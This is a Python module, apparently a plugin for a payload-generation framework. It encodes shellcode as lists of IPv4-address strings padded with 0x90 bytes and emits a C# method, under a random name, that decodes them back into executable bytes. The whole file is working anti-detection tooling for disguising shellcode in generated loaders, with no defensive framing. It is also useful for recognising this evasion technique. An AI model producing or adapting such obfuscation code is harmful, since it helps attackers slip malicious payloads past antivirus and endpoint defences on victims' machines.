import random
import string

class IPv4Obfuscate:

    def __init__(self, arguments):
        self.name = ''.join(random.SystemRandom().choice(string.ascii_uppercase) for _ in range(16))

    def imports(self):
        return []

    def codeblock(self):
        return """
        public static byte[] {name}(string[] encoded)
        {{
            byte[] decoded = new byte[encoded.Length*4];
            for (int i=0; i<encoded.Length; i++){{
                string[] octets = encoded[i].Split(new [] {{'.'}});
                for (int j=0; j<4; j++){{
                    decoded[i*4+j] = (byte)Int32.Parse(octets[j]);
                }}
            }}

            for (int i=decoded.Length - 1; i > 0; i--){{
                if (decoded[i] != 0x90){{
                    byte[] output = decoded.Skip(0).Take(i+1).ToArray();
                    return output;
                }}
            }}

            return decoded;
        }}
""".format(name = self.name)
    
    def compilerOptions(self):
        return []

    def obfuscate(self, decoded):
        encoded = []
        for i in range(0, len(decoded), 4):
            chunk = decoded[i:i+4]
            if len(chunk) < 4:
                chunk = chunk + ([b"\x90"] * (4 - len(chunk)))
            encoded.append('.'.join([f'{chunk[n]}' for n in range(0, 4)]))
        return encoded

    def transformer(self, shellcodestring):
        return shellcodestring.format(shellcode=f'{self.name}({{shellcode}})')